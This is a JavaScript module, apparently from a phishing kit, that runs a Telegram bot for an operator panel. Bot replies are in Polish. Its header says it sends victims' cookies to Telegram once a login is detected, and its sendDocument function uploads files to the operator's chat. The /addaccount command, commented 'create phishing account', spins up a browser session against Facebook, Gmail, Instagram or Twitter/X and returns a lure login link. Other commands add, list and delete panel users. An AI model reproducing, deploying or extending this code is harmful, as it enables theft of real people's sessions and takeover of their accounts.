// Telegram bot integration — mirrors the live activity log and sends
// cookies automatically once a login is detected. Entirely optional and
// best-effort: every export here is a silent no-op when TELEGRAM_BOT_TOKEN /
// TELEGRAM_CHAT_ID aren't configured, or when Telegram itself is unreachable.

import { config } from './config.js';

function apiUrl(method) {
  return `https://api.telegram.org/bot${config.telegramBotToken}/${method}`;
}

export function isEnabled() {
  return Boolean(config.telegramBotToken && config.telegramChatId);
}

export async function sendMessage(text, options) {
  if (!isEnabled()) return;
  const body = { chat_id: config.telegramChatId, text, disable_web_page_preview: true };
  if (options && options.parseMode) body.parse_mode = options.parseMode;
  try {
    await fetch(apiUrl('sendMessage'), {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify(body),
    });
  } catch { /* best-effort */ }
}

export async function sendDocument(buffer, filename, caption) {
  if (!isEnabled()) return;
  try {
    const boundary = '----spBoundary' + Date.now().toString(16);
    const parts = [];
    const text = (s) => parts.push(Buffer.from(s, 'utf8'));
    text(`--${boundary}\r\n`);
    text(`Content-Disposition: form-data; name="chat_id"\r\n\r\n${config.telegramChatId}\r\n`);
    if (caption) {
      text(`--${boundary}\r\n`);
      text(`Content-Disposition: form-data; name="caption"\r\n\r\n${caption}\r\n`);
    }
    text(`--${boundary}\r\n`);
    text(`Content-Disposition: form-data; name="document"; filename="${filename}"\r\n`);
    text(`Content-Type: application/octet-stream\r\n\r\n`);
    parts.push(buffer);
    text(`\r\n--${boundary}--\r\n`);
    await fetch(apiUrl('sendDocument'), {
      method: 'POST',
      headers: { 'content-type': `multipart/form-data; boundary=${boundary}` },
      body: Buffer.concat(parts),
    });
  } catch { /* best-effort */ }
}

export async function discoverChatId() {
  const res = await fetch(apiUrl('getUpdates') + '?limit=1&offset=-1');
  const data = await res.json();
  const upd = data.result?.[data.result.length - 1];
  return upd?.message?.chat?.id ?? upd?.channel_post?.chat?.id ?? null;
}

// ── Helper ────────────────────────────────────────────────────────────────────

async function replyTo(chatId, text) {
  try {
    await fetch(apiUrl('sendMessage'), {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text, disable_web_page_preview: true }),
    });
  } catch { /* best-effort */ }
}

// ── /adduser <login> <password> — create panel user ──────────────────────────

async function handlePanelAdduser(chatId, args) {
  if (args.length < 2) {
    await replyTo(chatId, '❌ Użycie: /adduser <login> <hasło>\nHasło min. 8 znaków.');
    return;
  }
  const username = String(args[0]).trim().toLowerCase();
  const password = String(args[1]);
  // Validate before touching userdb
  if (!/^[a-z0-9_-]{1,64}$/.test(username)) {
    await replyTo(chatId, '❌ Login: tylko litery a-z, cyfry, _ lub -. Max 64 znaki.');
    return;
  }
  if (password.length < 8) {
    await replyTo(chatId, '❌ Hasło za krótkie (min. 8 znaków).');
    return;
  }
  try {
    const { createUser } = await import('./userdb.js');
    await createUser(username, password);
    await replyTo(chatId, `✅ Użytkownik "${username}" utworzony.`);
  } catch (err) {
    if (err?.message === 'username_taken') {
      await replyTo(chatId, `❌ Login "${username}" już istnieje.`);
    } else {
      await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
    }
  }
}

// ── /users — list panel users ─────────────────────────────────────────────────

async function handleUsers(chatId) {
  try {
    const { listUsers } = await import('./userdb.js');
    const users = await listUsers();
    if (users.length === 0) {
      await replyTo(chatId, 'Brak użytkowników.');
      return;
    }
    const lines = users.map(u => {
      const date = new Date(u.createdAt).toISOString().slice(0, 10);
      const status = u.active ? '✓' : '✗';
      return `${status} ${u.username}  (${date})`;
    });
    await replyTo(chatId, `Użytkownicy (${users.length}):\n${lines.join('\n')}`);
  } catch (err) {
    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
  }
}

// ── /deluser <login> — delete panel user ─────────────────────────────────────

async function handleDeluser(chatId, args) {
  if (args.length < 1) {
    await replyTo(chatId, '❌ Użycie: /deluser <login>');
    return;
  }
  const username = String(args[0]).trim().toLowerCase();
  try {
    const { deleteUser } = await import('./userdb.js');
    const { deleteSessionsByUsername } = await import('./session.js');
    const removed = await deleteUser(username);
    if (!removed) {
      await replyTo(chatId, `❌ Nie znaleziono użytkownika "${username}".`);
      return;
    }
    deleteSessionsByUsername(username);
    await replyTo(chatId, `✅ Usunięto użytkownika "${username}" i unieważniono jego sesje.`);
  } catch (err) {
    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
  }
}

// ── /addaccount <name> <platform> — create phishing account ──────────────────

const PLATFORM_URLS = {
  facebook: 'https://www.facebook.com/', fb: 'https://www.facebook.com/',
  gmail: 'https://mail.google.com/mail/u/0/', gm: 'https://mail.google.com/mail/u/0/',
  google: 'https://mail.google.com/mail/u/0/',
  instagram: 'https://www.instagram.com/', ig: 'https://www.instagram.com/',
  twitter: 'https://x.com/', tw: 'https://x.com/', x: 'https://x.com/',
};
const PLATFORM_LABELS = {
  facebook: 'Facebook', fb: 'Facebook',
  gmail: 'Gmail', gm: 'Gmail', google: 'Gmail',
  instagram: 'Instagram', ig: 'Instagram',
  twitter: 'Twitter / X', tw: 'Twitter / X', x: 'Twitter / X',
};
const PLATFORM_CANONICAL = {
  facebook: 'facebook', fb: 'facebook',
  gmail: 'gmail', gm: 'gmail', google: 'gmail',
  instagram: 'instagram', ig: 'instagram',
  twitter: 'twitter', tw: 'twitter', x: 'twitter',
};

async function handleAddAccount(chatId, args, publicHost) {
  if (args.length < 2) {
    await replyTo(chatId, '❌ Użycie: /addaccount <imię> <platforma>\nPlatformy: facebook (fb), gmail (gm), instagram (ig), twitter (tw)');
    return;
  }
  const name = args[0];
  const platform = args[1].toLowerCase();
  const startUrl = PLATFORM_URLS[platform];
  if (!startUrl) {
    await replyTo(chatId, `❌ Nieznana platforma: "${platform}"\nDostępne: facebook (fb), gmail (gm), instagram (ig), twitter (tw)`);
    return;
  }
  const canonical = PLATFORM_CANONICAL[platform];
  const platLabel = PLATFORM_LABELS[platform];
  const label = `${name} – ${platLabel}`;
  const id = `${name}-${canonical}`.trim().toLowerCase().replace(/\s+/g, '-').replace(/[^a-z0-9_-]/g, '');
  if (!id) { await replyTo(chatId, '❌ Nazwa zawiera niedozwolone znaki.'); return; }
  try {
    const { saveAccount, getAccount } = await import('./accounts.js');
    const { start, stop, wipeProfile } = await import('./browser.js');
    const existed = Boolean(await getAccount(id));
    if (!existed) { await stop(id).catch(() => {}); await wipeProfile(id); }
    await saveAccount({ id, label, startUrl });
    await start(id, '127.0.0.1').catch(() => {});
    const saved = await getAccount(id);
    const ref = saved?.ref || '';
    const host = publicHost || config.publicHost;
    const link = ref && host ? `https://${host}/account/login?ref=${ref}` : '(brak PUBLIC_HOST)';
    await replyTo(chatId, `✅ Konto "${label}" utworzone!\n🔗 Link: ${link}`);
  } catch (err) {
    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
  }
}

// ── Long-poll command listener ────────────────────────────────────────────────

export function startCommandListener(publicHost) {
  if (!config.telegramBotToken) return;
  const adminId = config.telegramAdminId ? String(config.telegramAdminId) : '';

  let offset = 0;
  let running = true;

  async function poll() {
    while (running) {
      try {
        const url = apiUrl('getUpdates') + `?timeout=30&offset=${offset}&allowed_updates=["message"]`;
        const res = await fetch(url, { signal: AbortSignal.timeout(40_000) });
        if (!res.ok) { await new Promise(r => setTimeout(r, 5000)); continue; }
        const data = await res.json();
        for (const upd of data.result || []) {
          offset = upd.update_id + 1;
          const msg = upd.message;
          if (!msg?.text) continue;
          const fromId = String(msg.from?.id || '');
          const chatId = msg.chat?.id;
          if (adminId && fromId !== adminId) continue;
          const text = msg.text.trim();
          // Parse command (strip bot username suffix if present)
          const cmdMatch = text.match(/^(\/\w+)(?:@\S+)?\s*(.*)/s);
          if (!cmdMatch) continue;
          const cmd = cmdMatch[1].toLowerCase();
          const rest = cmdMatch[2].trim();
          const parts = rest ? rest.split(/\s+/) : [];

          if (cmd === '/adduser') {
            await handlePanelAdduser(chatId, parts);
          } else if (cmd === '/users') {
            await handleUsers(chatId);
          } else if (cmd === '/deluser') {
            await handleDeluser(chatId, parts);
          } else if (cmd === '/addaccount') {
            await handleAddAccount(chatId, parts, publicHost);
          }
        }
      } catch {
        await new Promise(r => setTimeout(r, 5000));
      }
    }
  }

  poll().catch(() => {});
  return () => { running = false; };
}
